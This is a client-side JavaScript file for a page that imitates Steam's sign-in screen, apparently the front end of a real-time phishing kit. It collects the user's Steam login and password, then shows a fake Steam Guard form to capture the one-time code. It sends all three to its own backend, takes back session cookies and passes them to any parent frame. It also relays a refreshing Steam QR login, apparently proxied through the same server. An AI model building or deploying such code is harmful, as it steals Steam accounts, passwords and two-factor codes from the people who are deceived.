

document.querySelector('.DjSvCZoKKfoNSmarsEcTS').addEventListener('click',async function(){
  const login = document.querySelector('._2GBWeup5cttgbTw8FM3tfx').value
  const password = document.querySelector('.pass').value

  console.log('login',login)
  console.log('password',password)

  const resp = await fetch('/Loginwithpass', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ login, password }),
  });

  const result = await resp.json();
  console.log('result',result);

  if(result.success){
    const container = document.querySelector('._3XCnc4SuTz8V8-jXVwkt_s');
    const newForm = generateSteamAuthForm(login,password);
    container.parentNode.replaceChild(newForm, container);
  }
})
  document.querySelector('._2u8B99t9Tx_uGgP58AcGYT').innerHTML = ` 
    <div class="qr-container">
      <img style="border-radius: 10px; height: 180px;" class="steamqrimg" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJQAAACUCAYAAAB1PADUAAAAAklEQVR4AewaftIAAAUHSURBVO3BS6okSRDAQCmo+19Z00tfJSQVrz+Dm9kvrHXJYa2LDmtddFjrosNaFx3Wuuiw1kWHtS46rHXRYa2LDmtddFjrosNaFx3Wuuiw1kWHtS768CWV36niJpWpYlKZKr6hMlU8UfmdKr5xWOuiw1oXHda66MNlFTepPFGZKiaVN1Smip+kMlU8qbhJ5abDWhcd1rrosNZFH36YyhsVb1S8UfENlaniicpUMal8Q+WNip90WOuiw1oXHda66MP/jMpU8UTlScVUMalMFU9Upor/k8NaFx3Wuuiw1kUf/nEqb6hMFZPKTRVPVKaKf9lhrYsOa110WOuiDz+s4idVTCqTylTxpGJSeUNlqphUbqr4mxzWuuiw1kWHtS76cJnK76QyVUwqT1SmiicVk8pUMalMFZPKGyp/s8NaFx3Wuuiw1kUfvlTxJ1VMKlPFpPJGxaQyVUwqU8U3Kv4lh7UuOqx10WGtiz58SWWqmFSmikllqphUpoo3VKaKSeWNikllqphUfpLKVPFEZaq46bDWRYe1LjqsdZH9whdUpoo3VJ5UTCpTxaQyVbyhMlVMKn9SxROVqeKJylTxjcNaFx3Wuuiw1kX2C19QeVLxhsqTiicqb1Q8UbmpYlKZKiaVNyomlTcqvnFY66LDWhcd1rrow2+mMlU8qXii8qRiUplU3qiYVN5QmSqeVHyjYlKZKm46rHXRYa2LDmtdZL9wkcqTikllqphUpopJZaqYVJ5UPFF5UvFEZap4ovKk4onKVDGpPKn4xmGtiw5rXXRY66IPX1L5RsWkMlU8qXhS8TdRmSp+p4pJ5abDWhcd1rrosNZFH35YxROVJyp/UsUbKlPFNyqeqLyh8pMOa110WOuiw1oXffhSxU0VT1Smim+oTBVPVKaKb6hMFW9UTCpvVNx0WOuiw1oXHda66MNlKlPFGypvqEwVk8pUMVW8UTGpTBVPVN5QeVLxDZWp4huHtS46rHXRYa2LPvwwlanijYpJ5YnKVPGGylQxqTxReVLxROVJxRsqU8WkctNhrYsOa110WOuiD19SmSqeqEwVk8qkMlVMKt9QmSomlTcqJpVvVLxR8UTlJx3Wuuiw1kWHtS6yX7hIZaq4SeWNikllqphUnlRMKk8qJpWp4onKVDGpPKmYVKaKmw5rXXRY66LDWhfZL3xBZaqYVN6omFSmiicqb1Q8UXlS8Q2Vmyr+pMNaFx3Wuuiw1kUfvlTxpOIbFU9UpopJ5U9SmSqeVLyh8kTljYpvHNa66LDWRYe1LvrwJZXfqWKqeKNiUnlS8Y2KSeUNlaniicpUMan8pMNaFx3Wuuiw1kUfLqu4SeUNlTcq3lCZKp6ofKPipopJ5abDWhcd1rrosNZFH36YyhsVb6hMFZPKpPKk4knFpDJVTBVPVCaVb1T8SYe1LjqsddFhrYs+/OMqJpUnFZPKpDJVTCpvqEwVTyqeqLyhMlVMFTcd1rrosNZFh7Uu+vCPU5kq/iYVk8pUMalMFVPFpDKpTBVPVKaKbxzWuuiw1kWHtS768MMqflLFTRWTylQxqUwqU8UTlZsqnqhMFTcd1rrosNZFh7Uu+nCZyu+k8qRiUpkq3lB5UjGpTBWTyhOVqeKJylTxRGWq+MZhrYsOa110WOsi+4W1LjmsddFhrYsOa110WOuiw1oXHda66LDWRYe1LjqsddFhrYsOa110WOuiw1oXHda66LDWRf8BifVgRS9WwIgAAAAASUVORK5CYII=" alt="Steam Login QR Code" class="qr-image">
    </div>
  `







let currentEventSource = null;

async function fetchNewQRCode() {
    try {

      const response = await fetch('/refreshqr', { method: 'POST' });
      const data = await response.json();

      if (data.success) {
        // Update QR code in UI
        document.querySelector('._35Q-UW9L8wv2fkImoWScgQ').innerHTML = `
          <div class="qr-container">
            <img style="border-radius: 10px; height: 180px;" src="${data.qrImageUrl}" alt="Steam QR Code">
          </div>
        `;

        // Close previous SSE connection (if any)
        if (currentEventSource) {
          currentEventSource.close();
        }

        // Start new SSE connection
        currentEventSource = new EventSource(`/refreshqr/events/${data.sessionId}`);

        currentEventSource.addEventListener('scanned', (e) => {
          const eventData = JSON.parse(e.data);
          console.log(eventData.message);
        });

        currentEventSource.addEventListener('authenticated', (e) => {
          // console.log(JSON.parse(e.data))
          const eventData = JSON.parse(e.data);
          console.log(eventData)
        });

        currentEventSource.addEventListener('timeout', (e) => {
          console.log("Session timed out. Refresh to try again.");
          currentEventSource.close();
        });

        currentEventSource.addEventListener('error', (e) => {
          console.log(e)
          currentEventSource.close();
          // console.error("Error:", JSON.parse(e.data));
          // currentEventSource.close();
        });
      }
      
    } catch (error) {
        console.error('Failed to fetch QR:', error);
    }
}

// Initial load
fetchNewQRCode();
// Set up interval to refresh every 2 minutes (120000 milliseconds)
const refreshInterval = setInterval(fetchNewQRCode, 12000);
















// document.querySelector('._35Q-UW9L8wv2fkImoWScgQ').innerHTML = ` <img src="${qr}>" alt="Steam Login QR Code" class="qr-image">`

function generateSteamAuthForm(login,password) {
  // Create a container div
  const container = document.createElement('div');
  container.className = '_3XCnc4SuTz8V8-jXVwkt_s';
  
  // Create the form
  const form = document.createElement('form');
  
  // Create the main structure (same as before)
  form.innerHTML = `
    <div class="_1NOsG2PAO2rRBb8glCFM_6 _2QHQ1DkwVuPafY7Yr1Df6w" style="gap: 14px;">
      <div class="_3JBYGcszFcaSNXHHSR3kCV">
        <div class="_1hKgiFuFaVR_Sq1Gj_gCnd">Account: <span class="_31Vq4lzNWs4WikXVr9J4hz">${login}</span></div>
        <div class="_2o5mE8JpPFOyJ0HwX_y0y7">You have a mobile authenticator protecting this account.</div>
      </div>
      <div class="_3huyZ7Eoy2bX4PbCnH3p5w">
        <div class="_1NOsG2PAO2rRBb8glCFM_6 _2QHQ1DkwVuPafY7Yr1Df6w" style="gap: 2px;">
          <div class="_1gzkmmy_XA39rp9MtxJfZJ Panel Focusable">
            <input type="text" maxlength="1" autocomplete="off" class="_3xcXqLVteTNHmk-gh9W65d Focusable code-input" role="textbox" data-index="0">
            <input type="text" maxlength="1" autocomplete="off" class="_3xcXqLVteTNHmk-gh9W65d Focusable code-input" role="textbox" data-index="1">
            <input type="text" maxlength="1" autocomplete="off" class="_3xcXqLVteTNHmk-gh9W65d Focusable code-input" role="textbox" data-index="2">
            <input type="text" maxlength="1" autocomplete="off" class="_3xcXqLVteTNHmk-gh9W65d Focusable code-input" role="textbox" data-index="3">
            <input type="text" maxlength="1" autocomplete="off" class="_3xcXqLVteTNHmk-gh9W65d Focusable code-input" role="textbox" data-index="4">
          </div>
        </div>
        <div class="_2Io_Jc8M4cRHn9cU4vHcqW" style="display: flex; flex-direction: row; justify-content: space-evenly; align-items: center;">
          <div class="_1rEWOv1g1uTXNhoWiJLQZs">Enter the code from your Steam Mobile App</div>
          <svg viewBox="0 0 33 49" fill="currentColor" class="_3WvDpj9Ng6SQliygcVqlJU">
            <path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M28 47.1106C29.1046 47.1106 30 46.2151 30 45.1106L30 3.72705C30 2.62248 29.1046 1.72705 28 1.72705L5 1.72705C3.89544 1.72705 3 2.62248 3 3.72705L3 45.1106C3 46.2151 3.89543 47.1106 5 47.1106L28 47.1106ZM5.68119 5.82741L27.3188 5.82741L27.3188 42.7772H5.68119L5.68119 5.82741ZM20.9999 44.944C20.9999 45.3429 20.6766 45.6662 20.2777 45.6662L12.7221 45.6662C12.3233 45.6662 11.9999 45.3429 11.9999 44.944C11.9999 44.5451 12.3233 44.2218 12.7221 44.2218H20.2777C20.6766 44.2218 20.9999 44.5451 20.9999 44.944ZM17.2778 4.44406C17.6767 4.44406 18 4.12071 18 3.72184C18 3.32296 17.6767 2.99962 17.2778 2.99962L15.7222 2.99962C15.3233 2.99962 15 3.32296 15 3.72184C15 4.12071 15.3233 4.44406 15.7222 4.44406L17.2778 4.44406Z"></path>
            <path fill="currentColor" d="M22.2456 22.4164C22.2456 21.6666 22.8127 21.0002 23.6228 21.0002C24.3519 21.0002 25 21.6666 25 22.4164C25 23.1661 24.3519 23.8325 23.6228 23.8325C22.8937 23.8325 22.2456 23.1661 22.2456 22.4164Z"></path>
            <path fill="currentColor" d="M18.6812 22.4164C18.6812 21.6666 19.2483 21.0002 20.0584 21.0002C20.8685 21.0002 21.5166 21.6666 21.4355 22.4164C21.4355 23.1661 20.8685 23.8325 20.0584 23.8325C19.3293 23.8325 18.6812 23.1661 18.6812 22.4164Z"></path>
            <path fill="currentColor" d="M15.1977 22.4164C15.1977 21.6666 15.7648 21.0002 16.5749 21.0002C17.304 21.0002 17.9521 21.6666 17.9521 22.4164C17.9521 23.1661 17.385 23.8325 16.5749 23.8325C15.8458 23.8325 15.1977 23.1661 15.1977 22.4164Z"></path>
            <path fill="currentColor" d="M11.7143 22.4164C11.7143 21.6666 12.2814 21.0002 13.0915 21.0002C13.8206 21.0002 14.4686 21.6666 14.4686 22.4164C14.4686 23.1661 13.9016 23.8325 13.0915 23.8325C12.3624 23.8325 11.7143 23.1661 11.7143 22.4164Z"></path>
            <path fill="currentColor" d="M8.14983 22.4164C8.14983 21.6666 8.7169 21.0002 9.527 21.0002C10.3371 21.0002 10.9852 21.6666 10.9042 22.4164C10.9042 23.1661 10.3371 23.8325 9.527 23.8325C8.79791 23.8325 8.14983 23.1661 8.14983 22.4164Z"></path>
          </svg>
        </div>
      </div>
      <div class="_1K431RbY14lkaFW6-XgSsC _2FyQDUS2uHbW1fzoFK2jLx">Use backup code</div>
      <a class="_1K431RbY14lkaFW6-XgSsC _2FyQDUS2uHbW1fzoFK2jLx" href="https://help.steampowered.com/wizard/HelpWithLoginInfo?lost=8&amp;issueid=402">Help, I no longer have access to my Steam Mobile App</a>
    </div>
  `;
  
  // Add the form to the container
  container.appendChild(form);
  
  // Get all the input elements
  const inputs = container.querySelectorAll('.code-input');
  
  // Add event listeners to each input
  inputs.forEach((input, index) => {
    // Focus the first input when the form loads
    if (index === 0) {
      setTimeout(() => input.focus(), 50);
    }
    
    // Handle input events
    input.addEventListener('input', (e) => {
        e.target.value = e.target.value.toUpperCase();
  
      // Only allow one character when typing
      if (e.inputType !== 'insertFromPaste' && e.target.value.length > 1) {
        e.target.value = e.target.value.slice(0, 1);
      }
      
      // Only allow one character when typing
      if (e.inputType !== 'insertFromPaste' && e.target.value.length > 1) {
        e.target.value = e.target.value.slice(0, 1);
      }
      
      // If a character was entered, move to next input
      if (e.target.value.length === 1 && e.inputType !== 'insertFromPaste') {
        const nextIndex = parseInt(e.target.dataset.index) + 1;
        if (nextIndex < inputs.length) {
          inputs[nextIndex].focus();
        }
      }
      
      // Check if all inputs are filled
      checkAllInputsFilled();
    });
    
    // Handle backspace/delete
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' || e.key === 'Delete') {
        if (e.target.value.length === 0) {
          const prevIndex = parseInt(e.target.dataset.index) - 1;
          if (prevIndex >= 0) {
            inputs[prevIndex].focus();
          }
        }
      }
    });
    
    // Handle paste event
    input.addEventListener('paste', (e) => {
      e.preventDefault();
      const pasteData = e.clipboardData.getData('text');
      
      // Fill inputs with pasted code
      for (let i = 0; i < Math.min(pasteData.length, inputs.length); i++) {
        inputs[i].value = pasteData[i];
      }
      
      // Focus the last filled input
      const lastFilledIndex = Math.min(pasteData.length - 1, inputs.length - 1);
      inputs[lastFilledIndex].focus();
      
      // Check if all inputs are filled
      checkAllInputsFilled();
    });
  });
  
  // Function to check if all inputs are filled
  async function checkAllInputsFilled() {
    const allFilled = Array.from(inputs).every(input => input.value.length === 1);
    
    if (allFilled) {
      // Get the full code
      const code = Array.from(inputs).map(input => input.value).join('');
      
      // Here you would typically submit the code to your backend
      console.log('Authentication code entered:', code);
      
      // For demonstration, we'll just show an alert
      const resp = await fetch('/steamOTP', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ login, password, authCode:code }),
      });

      const result = await resp.json();
      console.log('რესოფ ლოგინ:',result);

      if(result.success){
        console.log(result.cookies)
        // document.cookie
        window.parent.postMessage({ type: 'login-success', data: result }, '*');

      }else{
        alert(result.message)
      }
    }
  }
  
  return container;
}